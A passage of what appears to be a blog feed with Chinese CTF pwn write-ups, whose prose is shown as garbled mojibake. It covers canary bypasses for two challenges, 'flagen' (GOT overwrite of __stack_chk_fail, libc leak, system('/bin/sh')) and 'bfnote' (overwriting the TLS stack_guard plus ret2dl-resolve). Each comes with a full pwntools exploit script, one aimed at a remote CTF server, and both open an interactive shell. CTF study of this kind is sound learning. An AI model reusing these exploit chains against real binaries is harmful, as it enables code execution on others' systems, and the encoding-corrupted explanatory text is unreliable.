class="string">&#x27;A&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ä¹ä¹ä¹<br>æ‰¾åˆ°æ–‡ä»¶äº†<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg" alt="img"><br>ã€flagenã€‘<br>gotè¡¨è¦†å†™åŸç†<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png" alt="image-20230628224746293"><br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png" alt="image-20230628215919448"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png" alt="image-20230628220716478"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png" alt="image-20230628220912579"></p><p>æ­¤éƒ¨åˆ†ä¼šå°†è¾“å…¥éƒ¨åˆ†å˜é•¿ï¼ˆ1ä¸ªå­—èŠ‚å˜æˆ3ä¸ªå­—èŠ‚ï¼‰ï¼Œå…¶ä¸­destä¸ºæŒ‡å‘å †ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œåœ¨è°ƒç”¨leetify()æ—¶ï¼Œå…¶å€¼å°†è¢«å‹å…¥æ ˆä¸­ï¼Œç”±äºè¯¥å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¦†ç›–æ‰destçš„å€¼ä¸ºæŒ‡å®šåœ°å€ï¼Œåœ¨åç»­è°ƒç”¨strcpy()æ—¶ï¼Œå®ç°å‘ä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚<br>æˆ‘ä»¬å¯ä»¥å°†destè¦†ç›–ä¸ºstack_chk_failå‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼Œè¾¾åˆ°ä¿®æ”¹stack_chk_failå‡½æ•°è°ƒç”¨åœ°å€çš„ç›®çš„ï¼Œè¿™æ ·åç»­åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„æ˜¯æ”»å‡»è€…çš„ä»£ç ã€‚åˆå› ä¸ºcanaryå­˜åœ¨\x00æˆªæ–­ï¼Œéœ€å¯»æ‰¾åˆé€‚çš„å‡½æ•°è¿›è¡Œè¾“å…¥.</p><p>è¿˜æ˜¯é€šè¿‡æ³„éœ²libcbase getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">p,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">input</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">up</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">low</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addprefix</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prin</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">puts=<span class="number">0x08048510</span></span><br><span class="line">ret=<span class="number">0x0804846a</span></span><br><span class="line">stack_check=<span class="number">0x0804B01C</span></span><br><span class="line">pop_1=<span class="number">0x08048481</span></span><br><span class="line">pop_2=<span class="number">0x08048b00</span></span><br><span class="line">pop_3=<span class="number">0x08048d8d</span></span><br><span class="line">bss=<span class="number">0x804b144</span>+<span class="number">0x8</span></span><br><span class="line">a=<span class="number">0x08048F60</span></span><br><span class="line">read=<span class="number">0x080486CB</span></span><br><span class="line">p=process(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line">payload=p32(ret)+<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x55</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+p32(pop_1)+p32(stack_check)</span><br><span class="line">payload+=p32(puts)+p32(pop_1)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(bss+<span class="number">0x100</span>)+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;free&#x27;</span>])+p32(pop_1)+p32(bss+<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">input</span>(p,payload)</span><br><span class="line">change(p)</span><br><span class="line">alarm=u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å…­ã€ä¿®æ”¹TSLç»•è¿‡canary"><a href="#å…­ã€ä¿®æ”¹TSLç»•è¿‡canary" class="headerlink" title="å…­ã€ä¿®æ”¹TSLç»•è¿‡canary"></a>å…­ã€ä¿®æ”¹TSLç»•è¿‡canary</h4><p>åœ¨linuxä¸‹æœ‰ä¸€ç§çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆTread Local Storageï¼‰æœºåˆ¶ï¼Œå³TLS.<br>å­˜å‚¨çº¿ç¨‹çš„ä¸€äº›å…¨å±€å˜é‡.<br>ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the  </span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span>  </span><br><span class="line">  <span class="type">dtv_t</span> *dtv;  </span><br><span class="line">  <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span>  </span><br><span class="line">  <span class="type">int</span> multiple_threads;  </span><br><span class="line">  <span class="type">int</span> gscope_flag;  </span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;  </span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;  </span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  </span><br><span class="line">  ...  </span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;  </span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç»“æ„ä¸­uintptr_t stack_guardå°±æ˜¯canaryå€¼ï¼Œåˆ©ç”¨æ¼æ´ç¯¡æ”¹stack_guardå€¼å³å¯ç»•è¿‡canaryï¼Œè€Œgsæˆ–fså¯„å­˜å™¨æŒ‡å‘æ­¤ç»“æ„.</p><p>ã€bfnoteã€‘</p><p>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png" alt="image-20230628102341433"></p><p>ï¼ˆ2ï¼‰è¿›IDA<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png" alt="image-20230628105142174"></p><p>æ¼æ´ï¼šã€1ã€‘sæº¢å‡º0x600<br>           ã€2ã€‘v4è¿›è¡Œåˆå§‹åŒ–ï¼Œæ£€æµ‹é™åˆ¶äº†è¾“å…¥é•¿åº¦ï¼Œè€Œåˆ©ç”¨æ—¶å¹¶éåˆ©ç”¨äº†æ£€æµ‹å®Œæˆçš„å€¼ï¼Œåˆ©ç”¨äº†æ£€æµ‹å‰çš„å€¼ï¼Œä½¿å¾—æˆ‘ä»¬æ‹¥æœ‰ä¸€æ¬¡åœ¨ä»»æ„åœ°å€å†™å…¥é•¿åº¦çš„èƒ½åŠ›<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png" alt="image-20230628110303853"></p><p>gså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®å®é™…ä¸Šå°±æ˜¯å†…å­˜ä¸­æŸå¤„çš„tcbhead_tï¼Œè€Œåé¢çš„0x14æŒ‡çš„æ˜¯stack_guardç›¸å¯¹çš„åç§»ï¼Œé‚£ä¹ˆtcbhead_tåˆ°åº•å­˜å‚¨åœ¨å“ªï¼Œæ¯ä¸ªlibcä¸åŒï¼Œä½†æ˜¯å¯¹äºpwné¢˜ç»å¸¸ä½¿ç”¨çš„libæ¥è¯´ï¼Œå…¶åˆ†å¸ƒåŸºæœ¬å¦‚å›¾æ‰€ç¤º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png" alt="image-20230628111024934"></p><p>åœ¨libcåœ°å€æ›´ä¸‹ä½ç½®å’Œmmapä¸€æ ·åŒå±å…±äº«æ˜ å°„åŒºåŸŸï¼Œåç§»ç›¸å¯¹å›ºå®š.å½“æˆ‘ä»¬mallocä¸€ä¸ªç›¸å½“å¤§çš„ç©ºé—´ï¼ˆæ­¤é¢˜&gt;&#x3D;0x20000ï¼‰ï¼Œmallodå°±ä¼šç”¨mmapæ¥åˆ†é…å†…å­˜ç©ºé—´ï¼Œå…¶åˆ†é…ä½ç½®ä¹Ÿä¼šä½äºå…±äº«æ˜ å°„åŒºåŸŸï¼Œä¾æ®mmapæœºåˆ¶ï¼Œå…¶æ°å¥½å¤„äºtcbhead_råœ°å€çš„ä½åœ°å€å¤„ï¼Œæ­¤æ—¶åˆ©ç”¨ç¬¬äºŒä¸ªæ¼æ´å†™å…¥å¯ä¿®æ”¹canaryçš„å€¼ï¼Œä»è€Œå®ç°ç»•è¿‡.<a href="https://blog.csdn.net/wmq880204/article/details/115163244?ops_request_misc=%7B%22request_id%22:%22168792272416800213048166%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168792272416800213048166&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-115163244-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=mmap=%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6&spm=1018.2226.3001.4187">(12æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿmmapå†…å­˜æ˜ å°„æœºåˆ¶åŸç†_seqiqi_è è-çªçªçš„åšå®¢-CSDNåšå®¢</a></p><p>ï¼ˆ3ï¼‰ret2dl-resolveæœºåˆ¶åˆ©ç”¨ï¼ˆå»¶è¿Ÿç»‘å®šåº”ç”¨ï¼‰<br>åˆ©ç”¨çš„ä¸¤ç§ç»“æ„<em>Symï¼ˆx86ä¸ºElf32_Sym x64ä¸ºElf64_Symï¼‰</em>ã€<em>Relï¼ˆx86ä¸ºElf32_Rel x64ä¸ºElf64_Relï¼‰</em></p><p>SymåŸºæœ¬ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»ï¼ˆ4å­—èŠ‚ï¼‰</span></span><br><span class="line">  Elf32_Addr    st_value;ã€€ã€€<span class="comment">//(4å­—èŠ‚)</span></span><br><span class="line">  Elf32_Word    st_size;ã€€ã€€<span class="comment">//(4å­—èŠ‚)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12(1å­—èŠ‚)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;ã€€ã€€<span class="comment">//(1å­—èŠ‚)</span></span><br><span class="line">  Elf32_Section st_shndx;ã€€ã€€<span class="comment">// (2å­—èŠ‚)</span></span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf64_Sym</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;   <span class="comment">//ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»(4å­—èŠ‚ï¼‰</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;   <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12(1å­—èŠ‚)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;  <span class="comment">//(1å­—èŠ‚)</span></span><br><span class="line">  Elf64_Section st_shndx;  <span class="comment">//(2å­—èŠ‚ï¼‰</span></span><br><span class="line">  Elf64_Addr    st_value;  <span class="comment">//(8å­—èŠ‚)</span></span><br><span class="line">  Elf64_Xword   st_size;   <span class="comment">//(8å­—èŠ‚)</span></span><br><span class="line">&#125;;<span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</span></span><br></pre></td></tr></table></figure><p>RelåŸºæœ¬ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;<span class="comment">//æ˜¯gotçš„å¯¹åº”çš„åœ°å€(4å­—èŠ‚)</span></span><br><span class="line">    Elf32_Word       r_info; <span class="comment">//(4å­—èŠ‚),å…¶ä¸­æœ€ä½å­—èŠ‚åº”è¯¥ä¸º0x7ï¼Œå‰ä¸‰ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ•°å­—ï¼Œæ˜¯ç›¸å¯¹.dynsymèµ·å§‹çš„åç§»çš„ä¸‹æ ‡(å³åç§»è¿˜éœ€è¦é™¤ä»¥0x10)</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Xword    r_offset;   <span class="comment">//æ˜¯gotçš„å¯¹åº”çš„åœ°å€(8å­—èŠ‚)</span></span><br><span class="line">    Elf64_Xword    r_info;     <span class="comment">//(8å­—èŠ‚),å…¶ä¸­æœ€ä½å­—èŠ‚åº”è¯¥ä¸º0x7,å‰ä¸‰ä¸ªå­—èŠ‚å½“åšä¸€ä¸ª</span></span><br><span class="line">ã€€ã€€</span><br><span class="line"> Elf64_Sxword r_addend; ã€€ã€€<span class="comment">//(8å­—èŠ‚)</span></span><br><span class="line"> </span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure><p><u>ä¸€èˆ¬x64é€‰æ‹©gadgetè¿›è¡Œæ”»å‡» æ­¤é¢˜ä¹Ÿä¸º32ä½ æ•…ä»¥ä¸‹è¯¦ç»†ä»‹ç»32ä½ä½¿ç”¨ret2dl-resolveæ”»å‡»æ–¹æ³•</u><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png" alt="image-20230628115713705"></p><p>32ä½å»¶è¿Ÿç»‘å®šå…·ä½“æµç¨‹<br>*ç¬¬ä¸€ä¸ªpushçš„å€¼å®é™…ä¸Šæ˜¯å¯¹åº”çš„Relå’Œ.dynrelçš„ç›¸å¯¹åç§»<br> *jmpè·³è½¬åˆ°ç¬¬ä¸€ä¸ªç¬¬ä¸€ä¸ªpushåç§»å¯¹åº”çš„Relç»“æ„ï¼Œå–å‡ºé‡Œé¢çš„infoä¸­åŒ…å«çš„symç»“æ„çš„ä¸‹æ ‡ï¼Œæ‰¾åˆ°å¯¹åº”çš„symä¸­çš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä»è€Œè§£æåˆ°è¿™ä¸ªåç§°ä¸ºè¯¥å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œå°†å…¶åœ°å€å†™å…¥relç¬¬ä¸€é¡¹çš„åœ°å€ä¸­ã€‚æ­¤æ—¶ï¼Œå°†æ ˆæ¸…ç©ºåˆ°ä¸€å¼€å§‹pushçš„ä¸¤ä¸ªå€¼ä¹‹å‰ï¼Œä»è€Œæ­£å¸¸æ‰§è¡Œå¯¹åº”çš„å­—ç¬¦ä¸²çš„å‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬çš„ret2dl-resolveå®é™…ä¸Šè®¾ç½®ä¸º.got.plt<a href="%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9B%BE%E4%B8%AD%E7%9A%840x8048450">0</a>å¯¹åº”çš„åœ°å€å³å¯ï¼Œä»è€Œä»–è§£æå®Œæˆåä¼šç»§ç»­æŒ‰ç…§ç»™å®šçš„å‚æ•°æ‰§è¡Œã€‚<br><em>tip</em><br>ä¸­é—´çš„ç©ºç™½ï¼Œä½œä¸ºgapï¼Œæ˜¯å› ä¸ºæ‰§è¡Œçš„æ—¶å€™æœ€åæœ‰æ ˆåœ°å€çš„å˜åŒ–ï¼Œè‹¥æ— gapä½œä¸ºé˜»éš”ï¼Œå¯èƒ½æ ˆçš„å˜åŒ–ä¼šè¦†ç›–æ‰ä¸€äº›é‡è¦çš„æ•°æ®ï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥éœ€è¦ç•™æœ‰ä¸€å®šçš„gapä½œä¸ºæ ˆç©ºé—´å˜åŒ–çš„gap</p><p>ï¼ˆ4ï¼‰æ¼æ´åˆ©ç”¨<br>è§‚å¯Ÿä¸»å‡½æ•°å‘ç°ä¸€å…±è¿›è¡Œäº†ä¸‰æ¬¡è¾“å…¥ï¼š<br>ã€1ã€‘ä¿®æ”¹canaryã€æœ€ç»ˆçš„è¿”å›åœ°å€åŠæ ˆåœ°å€ï¼ˆå¯çœ‹æ±‡ç¼–ï¼‰<br>ã€2ã€‘ä¼ªé€ äº†ä¸€ä¸ªshellcode<br>ã€3ã€‘ä½¿ç”¨TSLï¼Œç»•è¿‡canary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png" alt="image-20230628134309027"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25009</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./bfnote&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bfnote&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">bss_start = <span class="number">0x0804A060</span></span><br><span class="line">gap = <span class="number">0x500</span></span><br><span class="line">stack_overflow = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x3e</span> - <span class="number">0xc</span> + <span class="number">0x8</span>) + p64(bss_start + gap + <span class="number">0x4</span>)</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your description : &#x27;</span>)</span><br><span class="line">r.send(stack_overflow)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your postscript : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_sym = p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> - <span class="number">0x80482C8</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">fake_rel = p32(bss_start) + p32(<span class="number">0x7</span> + <span class="built_in">int</span>((bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> + <span class="number">0x8</span> + <span class="number">0x8</span> - <span class="number">0x080481D8</span>) / <span class="number">0x10</span>) * <span class="number">0x100</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span> * gap + p32(<span class="number">0x08048450</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> * <span class="number">2</span> - <span class="number">0x080483D0</span>) + p32(<span class="number">0</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;system\x00\x00&#x27;</span> + fake_rel + fake_sym)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your notebook size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0x20000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0xf7d22714</span> - <span class="number">0xf7d01008</span> - <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;invalid ! please re-enter :\n&#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your note : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>éš¾éš¾éš¾ å•ƒå•ƒå•ƒ<br>æ˜å¤©åˆæ˜¯æ–°çš„ä¸€å¤©â­<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cæ¢ç´¢ç¢ç‰‡â€”â€”æ“ä½œç¬¦</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      
